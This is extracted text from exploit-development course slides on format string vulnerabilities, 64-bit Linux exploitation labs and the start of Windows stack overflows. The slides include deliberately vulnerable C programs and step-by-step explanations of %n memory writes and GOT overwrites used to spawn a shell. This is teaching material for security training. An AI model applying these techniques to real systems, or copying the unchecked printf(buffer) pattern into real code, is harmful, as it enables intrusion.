Socket - create an endpoint for communication 
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
References
X86 64 Register and Instruction Quick Start
Linux System Call Table For X86 64
http://man7.org/linux/man-pages/man2/socketcall.2.html 
http://man7.org/linux/man-pages/man2/connect.2.html 
https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
|  p.118
Socketcall - socket system calls 
Connect - initiate a connection on a socket 
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
References
Developing custom shellcode x64 Linux
Linux Shellcoding (Part 1.0)
https://bufferoverflows.net/developing-custom-shellcode-x64-linux
https://0x00sec.org/t/linux-shellcoding-part-1-0/289
|  p.119
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Linux Shellcoding
In this lab, you will practice writing and executing Linux shellcode.
|  p.120
© Caendra Inc. 2019
All Rights Reserved
Linux Advanced Exploitation
S e c t i o n  0 1  |  M o d u l e  0 5
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Table of Contents
MODULE 05 | LINUX ADVANCED EXPLOITATION
5.1 Format String Vulnerabilities
5.2 Format String Exploitation
5.3 Exploitation on 64-bit Linux (7 labs)
|   p.2
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
Exploiting format string vulnerabilities
How to approach exploitation on 64-bit Linux Systems
|   p.3
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
5.1
Format String 
Vulnerabilities
|  p.4
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
In the previous modules we were focused on stack-based 
buffer overflows. We assume you already understand how 
the arguments are passed to functions (via the stack before
a function call) and how the stack works during a program’s 
runtime.
There is another class of vulnerabilities that are related to 
the stack, this class is known as format string
vulnerabilities.
5.1 Format String Vulnerabilities
|  p.5
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
The format string is directly related to the printf* functions 
family, and functions similar to them such as:
• fprintf – prints to a FILE stream
• printf – prints to the ‘stdout’ stream
• sprintf – prints into a string
• snprintf – prints into a string with length checking
• setproctitle – set argv [ ]
• syslog – output to the syslog facility 
5.1 Format String Vulnerabilities
|  p.6
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
What do those functions have in common? 
All of them are used to print data to a specified destination. 
But what is special about all of them is that they make use 
of arguments that work as string formatters.
5.1 Format String Vulnerabilities
|  p.7
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
For example, you have already seen arguments like the 
following:
• printf(„%s”, variable); prints the variable as string 
(formats it)
• printf(„%p”, variable); prints the variable as pointer
5.1 Format String Vulnerabilities
|  p.8
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Printf()-like functions, once supplied with a string format 
argument and another variable as an argument, will use the 
format string (first argument) to print the variable (second 
argument) in a certain way.
The most common string format arguments are %x (hex), 
%p (pointer), %d (decimal) and %s (string).
5.1 Format String Vulnerabilities
|  p.9
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Mutiple formats can exist in one printf operation. Let’s 
consider the following code.
5.1 Format String Vulnerabilities
|  p.10
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We  compile it in a default way (gcc example.c –o example) 
and then run it. The subsequent variables are printed in the 
respective formats – first as a decimal, second as a pointer, 
and finally as a string:
5.1 Format String Vulnerabilities
|  p.11
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Now let’s change the code so that the printf formats do not 
match the supplied arguments. We change all formats to 
%x, plus we add one additional formatter. So now we have 4 
formats and 3 arguments to be formatted. We compile it 
with gcc and disregard any thrown warnings.
5.1 Format String Vulnerabilities
|  p.12
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
If we now run the program, it does not segfault. It prints all 
values plus an additional value.
5.1 Format String Vulnerabilities
|  p.13
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s run the program in the debugger to see what happens 
inside. We’ll put a breakpoint on printf and start the 
program.
5.1 Format String Vulnerabilities
|  p.14
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Now, if we take a look at the stack layout just before the 
call to printf, we recognize some values. The first address 
is the return address and the second one points to the 
formatting argument, which is held in memory as a string.
5.1 Format String Vulnerabilities
|  p.15
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The remaining four items are the same hexadecimal values 
that are printed by the vulnerable program.
5.1 Format String Vulnerabilities
|  p.16
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
As you probably noticed, there is no information about the 
variables we want to print. 
The printf function works in this way: the user is 
responsible for supplying the proper amount of arguments 
and formatters. Then, as with every other function, during
the call, all function arguments are pushed onto the stack. 
First the formatting part 
and then the arguments 
to be formatted.
5.1 Format String Vulnerabilities
|  p.17
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
If the number of formatters are higher than the number of 
arguments, the subsequent items down the stack are assumed 
to be arguments. Let’s modify the example program once again. 
The gcc will throw even more warnings.
5.1 Format String Vulnerabilities
|  p.18
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
As we see, in this case, printf starts to take subsequent 
items from the stack and print them.
5.1 Format String Vulnerabilities
|  p.19
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
In the early 2000’s, hackers started abusing the behavior of 
the printf() function. If a user had control over the printf 
arguments, he could force the program to behave in an 
unexpected way. 
Thus far, the example shown could lead to information 
leakage or denial of service when a segfault is reached.
5.1 Format String Vulnerabilities
|  p.20
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
The format string vulnerability was considered dead / rare 
until 2019, when several exploits were published by security 
researchers exploiting a format string vulnerability and
allowing pre-authentication RCE on popular VPN services.
Since the vulnerability class is back to life, let’s understand 
how it is being exploited. We will also show you how this 
kind of vulnerability can be abused in order to achieve code 
execution.
5.1 Format String Vulnerabilities
|  p.21
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
5.2
Format String 
Exploitation
|  p.22
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
For the purpose of the exercise,
we will try to alter the original 
execution flow of the program on 
your right.
As you can see in the source 
code, there is a piece of dead 
code that is not executed 
(function deadcode()). 
Additionally, in the main function, 
the vuln() function is called.
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int target;
void deadcode()
{
char *information = "The execution flow was redirected!";
printf(information);
_exit(1);
}
void vuln()
{
char buffer[512];
fgets(buffer, sizeof(buffer), stdin); 
printf(buffer);
exit(1);
}
int main(int argc, char **argv)
{
vuln();
}
|  p.23
5.2 Format String Exploitation
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The vuln() function takes the user input from stdin and 
copies it to a memory location referenced as buffer[512].
This memory location is then passed as an argument to 
printf.
5.2 Format String Exploitation
|  p.24
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
If the user inputs some legitimate characters as an 
argument, the user input is reflected back. But if string 
formatters are present in the buffer, the function prints out 
subsequent positions from the stack format as requested.
5.2 Format String Exploitation
|  p.25
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Obviously, this is not intended behavior and we have 
confirmed that the application is vulnerable to format 
string. But how can we exploit it?
Let’s try to introduce the exploitation strategy step by step. 
First, we will try to print the string present in the deadcode() 
function. The next step will be to alter the value of the 
variable target – as you will come to know soon, printf can 
not only read but also write values to memory.
5.2 Format String Exploitation
|  p.26
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s first try to go down the stack and see what values are 
there. In order to achieve this, we will use a python script, in 
which the output will be written to a file and then fed to the 
vulnerable program.
5.2 Format String Exploitation
|  p.27
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s try to run the binary and feed the python output to it.
5.2 Format String Exploitation
|  p.28
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
What happens here is that we feed printf the following 
arguments: „AAAA”, then 10 times the pointer format. 
As a result, our string „AAAA”, as well as the format 
arguments, are put somewhere in the stack.
5.2 Format String Exploitation
|  p.29
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Then, as printf reaches the format arguments and parses 
them, it pulls 10 items from the stack and prints them to the
stdout formatted as pointers. 
Let’s assume we are willing to abuse such a vulnerability in 
order to leak some information, e.g. stack cookie. In such a 
case, only one of those values from the stack will be 
interesting for us. Can we access just one of them directly?
5.2 Format String Exploitation
|  p.30
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s assume we want to print just the „AAAA” string we fed 
into the binary at the beginning and not all of the items 
from the stack on the way to it. In order do to that, we can 
use Direct Parameter Access.
Direct parameter access is a specific form of the format 
parameter. Instead of writing %p %p %p, we can write %3$p
to just get the third value formatted as the pointer.
5.2 Format String Exploitation
|  p.31
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s just get the AAAA using the direct parameter access, 
as follows.
5.2 Format String Exploitation
|  p.32
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Can we print the string „AAAA” itself using this way? 
Unfortunately not.
5.2 Format String Exploitation
|  p.33
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
This is because the format arguments require different 
values to be fed to them. Some require passing the 
arguments to be formatted by reference, and some need it 
by value.
By reference, it means it expects a pointer to the argument 
to be formatted – and that is the case with %s. Since on the 
stack there is just „0x41414141”, this is not a valid memory 
location, so trying to use a pointer to such a value ends in a 
segfault.
5.2 Format String Exploitation
|  p.34
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
On the other hand, %p requires just the value, so whatever is 
on the stack will be printed. It is thus important when 
testing for format strings to use formatters that require a 
value. 
If you feed too many %s’s to a vulnerable application, it is 
likely that you will crash it.
5.2 Format String Exploitation
|  p.35
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
Below is a table that contains some format string 
arguments and how they can be passed. You can see that a 
new item is present in the bottom row. 
5.2 Format String Exploitation
|  p.36
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
%n is different from all other format parameters, as it 
allows writing bytes to memory instead of reading it. This 
is what makes format strings really dangerous. 
Let’s figure out how it really works.
5.2 Format String Exploitation
|  p.37
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
If you try to use %n in the same way as the other format 
parameters, you will most likely end up in a segfault. 
This is because if %n is used in a printf-like statement, the 
argument to it should be of format (int *)&address – so in 
short, it should be a pointer to a valid memory location 
where the output of %n will be written.
5.2 Format String Exploitation
|  p.38
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
What does „bytes written so far” mean? It is a number of 
bytes that was already printed out by the printf function. For 
example, printf(„AAAA%n”, &x) will store a value of 4 (As 4 
„A”’s were printed so far) in the „x” variable, which needs to 
be passed as its address. 
Let’s see an example.
5.2 Format String Exploitation
|  p.39
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Again, we will use the same 
application. 
As you remember, there is a 
variable named „target”. 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int target;
void deadcode()
{
char *information = "The execution flow was redirected!";
printf(information);
_exit(1);
}
void vuln()
{
char buffer[512];
fgets(buffer, sizeof(buffer), stdin); 
printf(buffer);
exit(1);
}
int main(int argc, char **argv)
{
vuln();
}
|  p.40
5.2 Format String Exploitation
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s try to use the %n parameter to change the value of 
variable target. In order to do that, we will need to pass the 
address of the target() variable to the printf() function. We 
will try to write the value 0x41 to it.
First, we enter gdb and check the value of the target 
variable, as follows.
5.2 Format String Exploitation
|  p.41
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We know that our input is reflected back to the printf as the 
4th position on the stack. 
We will abuse this fact in order to supply the address of the
target variable back to printf() as an argument to the %n 
formatter.
5.2 Format String Exploitation
|  p.42
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We will use the script below and store the output in the target.txt
file. The address must be stored in a format that is suitable for 
storing it in memory, so we’ll use the struck pack. Additionally, we 
will try to save the value 0x41 to the target variable.
5.2 Format String Exploitation
|  p.43
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
As the variable target is not used or printed, we will need to 
observe it within the debugger. Let’s run the fmt binary and 
disas the vuln function.
5.2 Format String Exploitation
|  p.44
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s navigate to the bottom of the screen, near the end of 
the vuln() function’s disassembly. Let’s then put a 
breakpoint after the call to printf().
5.2 Format String Exploitation
|  p.45
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s also view the address where the variable is stored.
5.2 Format String Exploitation
|  p.46
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Now we’ll check the value of the target variable at the 
beginning of the program, as well as after the printf call.
5.2 Format String Exploitation
|  p.47
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The variable was modified, which is good, since we now 
have confirmed that we can write to memory. However, the 
value is not what we expected.
5.2 Format String Exploitation
|  p.48
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Printf took all of the characters printed out and that’s the 
number we received. In order to decrease the number of 
characters outputted, we need to use direct parameter 
access, but we also need to decrease the number of „A”’s 
by the current length of the buffer. Let’s modify the script.
5.2 Format String Exploitation
|  p.49
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
This time, we have achieved the write of the desired value 
to the location of choice. We are close to the write-what-
where condition.
5.2 Format String Exploitation
|  p.50
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Before we will be able to write a fully arbitrary value, let’s 
highlight the fact that writing a value that will match some 
memory address starting at 0x8040000 or higher would 
require printing out at least hundreds of millions of „A”’s. 
This can effectively kill the terminal or crash the program. 
Fortunately, there is another helpful functionality of printf 
related to parameter access. While utilizing %n, we can 
make use of short writes.
5.2 Format String Exploitation
|  p.51
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Short writes allow us to write 2 bytes at a certain location 
and use a format parameter %hn. Thus, if we want to write 
0x41414141 to address 0x08040102, we can:
• Write 0x4141 to 0x8040102
• And then write 0x4141 to 0x8040104
Each time, the two most significant bytes are overwritten 
with a 2-byte integer, that’s why we need to split the write 
into two parts.
5.2 Format String Exploitation
|  p.52
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Also, during the second write, we need to remember that 
the count of bytes written so far grows with each write, so if 
we write some bytes with the first write, then we need to 
decrease the second write by that number. 
Let’s see this on an example. We will now aim to write a
value of 0x41424344 to the target variable.
5.2 Format String Exploitation
|  p.53
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Due to the byte order, to achieve 0x41424344 we will first 
write 0x4344 and then 0x4142. Based on this, let’s 
construct an exploit.
5.2 Format String Exploitation
|  p.54
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The output of the current script is saved as „wrongmath”. It 
is then fed to the gdb.
5.2 Format String Exploitation
|  p.55
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The result is close to what we needed, but the math has to 
be adjusted.
5.2 Format String Exploitation
|  p.56
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The issue is that the second part of the number we want to 
write when presented as a standalone 2-byte number, is 
lower than the first part. 
Thus, it is not possible to decrease it. 
5.2 Format String Exploitation
|  p.57
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
However, the desired value can be obtained using a trick –
increase the second number by making it a 3-byte value via 
adding „1” on the left. Now the subtraction should bring the 
desired effect.
5.2 Format String Exploitation
|  p.58
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We save the result as „correctmath” and proceed in the gdb 
in the same way, (run < correctmath).
This is the result of what we wanted to achieve:
5.2 Format String Exploitation
|  p.59
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Using a format string vulnerability, we achieved a write-
what-where condition. 
5.2 Format String Exploitation
|  p.60
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
In this case, a good target for the overwrite will be:
• The return address - so that we will go back from the
vuln() function to an arbitrary location.
• If there is no ASLR, we can place the shellcode in the 
environment variables and then use its address to 
overwrite some strategic pointer.
• A GOT entry of another function, e.g. exit().
• Overwrite dynamic sections like .dtors 
(see https://www.win.tue.nl/~aeb/linux/hh/formats-
teso.html)
5.2 Format String Exploitation
|  p.61
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s use a modified source code of 
the vulnerable program. 
A helper function was added. We will 
compile it as a non-hardened version 
so: gcc –fno-stack-protector –z 
execstack f.c –o f
However, the format string exploit, in 
such a case, is not stopped by DEP or 
ASLR as we do not operate on the 
stack execution or randomized 
addresses.
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int target;
void shell()
{
system("/bin/sh");
}
void deadcode()
{
char *information = "The execution flow was redirected!";
printf(information);
_exit(1);
}
void vuln()
{
char buffer[512];
fgets(buffer, sizeof(buffer), stdin); 
printf(buffer);
exit(1);
}
int main(int argc, char **argv)
{
vuln();
}
|  p.62
5.2 Format String Exploitation
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We will use the format string to exploit an arbitrary write. 
Let’s first choose what and where we want to write.
As the function that calls a shell is at 0x80484eb, this will 
be the value we would like to write to a current pointer.
5.2 Format String Exploitation
|  p.63
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Right after the call to printf, there is another function called 
in vuln() – exit(). 
This is a good candidate for the GOT overwrite, as it is 
called directly after printf.
5.2 Format String Exploitation
|  p.64
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Using the 
dissasembly, we 
can also locate the 
GOT entry for the 
exit.
5.2 Format String Exploitation
|  p.65
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We will use the address 0x804a01c and write the address 
of the shell() function.
5.2 Format String Exploitation
|  p.66
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Similar to the arbitrary write example, let’s create the 
exploit.
5.2 Format String Exploitation
|  p.67
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
We save it as „e”. Then, a breakpoint before exit is set to 
examine if its entry was written properly.
5.2 Format String Exploitation
|  p.68
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
As the breakpoint is hit, we examine the memory content at
the GOT entry for exit. The address of shell() is there!
5.2 Format String Exploitation
|  p.69
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
If we allow the program to continue, we see that bash is
spawned.
5.2 Format String Exploitation
|  p.70
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Let’s run the exploit outside of the debugger and also use 
the cat trick to keep the stdin open, as follows.
5.2 Format String Exploitation
|  p.71
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
The stdin is corrupted but the shell is spawned. We have a 
working exploit. 
Let’s summarize the proces of exploiting a format string:
•
Confirm the vulnerability – the input of %x, %p might cause the 
application to behave in unusual way, and %s or %n may crash 
it.
•
Find the offset to our input on the stack – after which the 
format argument of our input starts to be printed.
•
Confirm the offset using direct parameter access.
5.2 Format String Exploitation
|  p.72
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
• Find the overwrite candidate. It can be a GOT entry of a 
function.
• Find the address with which it can be overwritten. 
Depending on the countermeasures in place, it might be 
another function address, or the address of the shellcode 
hidden in an environment variable.
• Try to perform the arbitrary write using short writes and 
direct parameter access. You can confirm what you are 
overwriting using the debugger.
5.2 Format String Exploitation
|  p.73
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Format string is rather rare nowadays, but as practice 
shows, they can still emerge in the wild. Moreover, they can 
be a strong auxiliary attack vector for creating memory 
leaks.
You’ll have the opportunity to practice format string 
exploitation in our Hera lab environment in a later module.
5.2 Format String Exploitation
|  p.74
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. There are several 
interesting labs up next! 
|  p.75
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
5.3
Exploitation on 64-
bit Linux
|  p.76
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Every penetration tester should feel comfortable while 
performing 64-bit exploit development. 
To avoid lengthy slides in this module you will have the 
opportunity to learn about and practice 64-bit exploit 
development through hands-on examples hosted in our 
Hera labs.
5.3 Exploitation on 64-bit Linux
|  p.77
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a stack 
overflow vulnerability on a Linux 
x64 system. During the lab, you 
will have to find the proper 
payload length for precisely 
overwriting RIP and then execute 
the supplied shellcode.
Linux x64 Basic Stack 
Overflow
|  p.78
Hera Lab #1
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
Format String vulnerability on a 
hardened Linux system. You will 
also be shown how to evade 
strict firewalls by utilizing Socket 
Reuse shellcode.
Strict Firewall Bypass 
(Format String Exploitation 
+ Socket Reuse Shellcode)
|  p.79
Hera Lab #2
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
stack overflow vulnerability on 
a Linux x64 system with NX 
enabled. To bypass the NX 
mechanism, you will use both 
the ret2libc technique and ROP.
Linux x64 NX Bypass 
(ret2libc + ROP)
|  p.80
Hera Lab #3
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
Format String vulnerability on a 
hardened Linux system. During 
the lab, you will be shown how 
to utilize ROP to bypass Linux 
ASLR and NX.
Linux NX & ASLR Bypass 
(Format String Exploitation 
+ ROP)
|  p.81
Hera Lab #4
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
By exploiting Linux (including 
x64) systems with the ret2libc 
technique, we can only rely on 
gadgets/functions existing in 
libc. This lab will show you how 
you can sometimes overcome 
this limitation and execute your 
own shellcode by tampering with 
the stack’s execution state.
Overcome ret2libc 
Limitations
|  p.82
Hera Lab #5
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
Format String vulnerability on a 
Linux x64 system with Stack 
Canary, NX, and ASLR enabled. 
During the lab, you will be 
shown how to bypass all those 
mechanisms by leaking critical 
contents of memory.
Linux x64 Stack Canary, 
NX, & ASLR Bypass
|  p.83
Hera Lab #6
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
stack overflow vulnerability on 
a Linux x64 system with ASLR 
enabled. During the lab, you will 
be shown how to bypass the 
ASLR mechanism through a 
technique known as ret2plt and 
ROP.
Linux x64 ASLR Bypass
|  p.84
Hera Lab #7
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
References
|  p.85
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
References
Exploiting Format String Vulnerabilities
Protostar Format 4 Walkthrough
Exploiting Format String Vulnerabilities
Format String Vulnerability
https://www.win.tue.nl/~aeb/linux/hh/formats-teso.html
https://medium.com/@airman604/protostar-format-4-walkthrough-b8f73f414e59
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
|  p.86
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
References
Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, 
with Uber as Case Study! 
Protostar Format 4 Walkthrough
Exploiting Format String Vulnerabilities
Format String Vulnerability
https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
https://medium.com/@airman604/protostar-format-4-walkthrough-b8f73f414e59
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
|  p.87
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Linux x64 Basic Stack Overflow
In this lab, you will practice identifying and exploiting a stack overflow 
vulnerability on a Linux x64 system. During the lab, you will have to find the 
proper payload length for precisely overwriting RIP and then execute the 
supplied shellcode.
Strict Firewall Bypass 
(Format String Exploitation + Socket Reuse Shellcode)
In this lab, you will practice identifying and exploiting a Format String 
vulnerability on a hardened Linux system. You will also be shown how to 
evade strict firewalls by utilizing Socket Reuse shellcode.
|  p.88
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Linux x64 NX Bypass (ret2libc + ROP)
In this lab, you will practice identifying and exploiting a stack overflow 
vulnerability on a Linux x64 system with NX enabled. To bypass the 
NX mechanism, you will use both the ret2libc technique and ROP.
Linux NX & ASLR Bypass 
(Format String Exploitation + ROP)
In this lab, you will practice identifying and exploiting a Format String 
vulnerability on a hardened Linux system. During the lab, you will be 
shown how to utilize ROP to bypass Linux ASLR and NX.
|  p.89
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Overcome ret2libc Limitations
By exploiting Linux (including x64) systems with the ret2libc technique, we 
can only rely on gadgets/functions existing in libc. This lab will show you 
how you can sometimes overcome this limitation and execute your own 
shellcode by tampering with the stack’s execution state.
Linux x64 Stack Canary, NX, & ASLR Bypass
In this lab, you will practice identifying and exploiting a Format String 
vulnerability on a Linux x64 system with Stack Canary, NX, and ASLR 
enabled. During the lab, you will be shown how to bypass all those 
mechanisms by leaking critical contents of memory.
|  p.90
XDS v1: Section 1, Module 5 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Linux x64 ASLR Bypass
In this lab, you will practice identifying and exploiting a stack overflow 
vulnerability on a Linux x64 system with ASLR enabled. During the lab, you 
will be shown how to bypass the ASLR mechanism through a technique 
known as ret2plt and ROP.
|  p.91
© Caendra Inc. 2019
All Rights Reserved
Windows Stack Smashing
S e c t i o n  0 2  |  M o d u l e  0 1
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Table of Contents
MODULE 01 | WINDOWS STACK SMASHING
1.1 Windows Stack Overflow
1.2 Windows Basic Overflow Analysis
|   p.2
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
How to deal with a basic buffer overflow on a Windows 
system
Analysis of a basic buffer overflow vulnerability in old 
software
|   p.3
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
1.1
Windows Stack 
Overflow
|  p.4
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
While advanced Windows exploitation greatly differs from 
Linux, basic stack smashing is very similar. 
However, Windows is a GUI environment that has GUI 
debuggers, while on Linux, we mostly use command-line 
tools when working with exploits.
1.1 Windows Stack Overflow
|  p.5
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Similarly to Linux, the key part is to identify program entry 
points. 
In this module, we will focus on the exploitation itself and 
not on attack surface discovery.
1.1 Windows Stack Overflow
|  p.6
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Keep in mind that every input that the application parses 
might lead to a vulnerability, especially:
• Form fields where text can be placed into
• Command line arguments
• Remote resources fetched by the application
• Files parsed by an application
1.1 Windows Stack Overflow
|  p.7
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The core of buffer overflow exploitation on Windows is the 
same as it is on Linux. The stack will get overwritten with 
lots of data; for example, this could be due to an 
uncontrolled copy operation. 
In the end, the overly large buffer overwrites the saved 
return address, and upon returning from the current stack 
frame to the previous (overwritten) one, the crash occurs as 
EIP is overwritten with user data.
1.1 Windows Stack Overflow
|  p.8
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The most basic buffer overflows on Windows are called 
vanilla EIP overwrites or direct EIP overwrites, where after 
supplying enough amount of data the EIP instantly gets 
overwritten with it.
Throughout this course, you will also learn other styles of 
Windows stack overflow exploitation that involve indirect 
EIP overwrite like Unicode overflows or SEH-based exploits.
1.1 Windows Stack Overflow
|  p.9
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
We will focus on analyzing a practical example of Windows 
